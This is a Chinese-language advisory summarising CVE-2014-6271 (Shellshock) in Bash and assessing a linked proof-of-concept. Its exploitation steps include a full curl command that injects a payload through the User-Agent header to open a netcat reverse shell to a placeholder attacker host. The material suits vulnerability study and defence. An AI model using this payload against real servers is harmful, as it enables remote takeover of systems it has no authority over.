## CVE-2014-6271 - Bash 远程命令执行(RCE)

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行(RCE)

**影响应用:** Bash

**危害等级:** 高危

**CVSS评分:** 10.0

**影响版本:** 1.14 to 4.3

**利用条件:** 需要网络访问，受影响的CGI脚本需要被调用

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于Bash shell中的严重漏洞。该漏洞源于Bash在处理环境变量定义时存在缺陷，允许攻击者在环境变量中附加恶意代码，当Bash执行这些变量时，恶意代码也会被执行，从而导致远程命令执行。此漏洞影响范围广泛，任何使用Bash处理外部输入的系统都可能受到影响，例如，CGI脚本、SSH服务器等。 

POC有效性分析：提供的POC代码通过构建一个包含恶意代码的User-Agent头，向目标服务器发送HTTP请求。如果目标服务器上的CGI脚本使用Bash来处理User-Agent头，那么恶意代码就会被执行。POC代码中使用了`nc`命令来建立反向shell，从而控制目标服务器。该POC能够有效验证漏洞的存在，并且可以用来进行渗透测试。

利用步骤：
1. 搭建受漏洞影响的web服务，例如apache2，并且配置CGI脚本。
2. 准备攻击机，监听指定端口（例如5050）。
3. 使用curl命令，构造包含恶意代码的User-Agent头，向目标服务器的CGI脚本发送HTTP请求。例如：`curl -H "user-agent: () { :; }; echo; /bin/nc -e /bin/bash <Attacker Host IP> 5050" http://<docker host IP>:8080/cgi-bin/vulnerable`。
4. 如果漏洞存在，攻击机将会收到来自目标服务器的反向shell。
5. 攻击者可以使用该shell执行任意命令，例如修改网页内容。

投毒风险分析：该POC的投毒风险较低，因为其主要功能是验证漏洞的存在，而不是植入后门或进行其他恶意活动。POC中使用了`nc`命令来建立反向shell，这是一种常见的渗透测试技术，不属于恶意代码。POC修改网页内容的部分使用了`sed`命令，虽然可以用来修改文件，但在这里只是为了演示漏洞的利用，不属于恶意行为。然而，任何能够执行任意命令的漏洞都存在被恶意利用的风险。如果攻击者利用该漏洞在目标服务器上植入后门、窃取数据或进行其他恶意活动，那么就会造成严重的危害。此外，POC中使用了Docker镜像，如果Docker镜像本身包含恶意代码，那么也会增加投毒的风险。因此，在使用该POC时，需要仔细审查代码，确保其安全性。

**项目地址:** https://github.com/vulnwatchdog/SecHub/tree/main/cve/CVE-2014-6271

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2014-6271
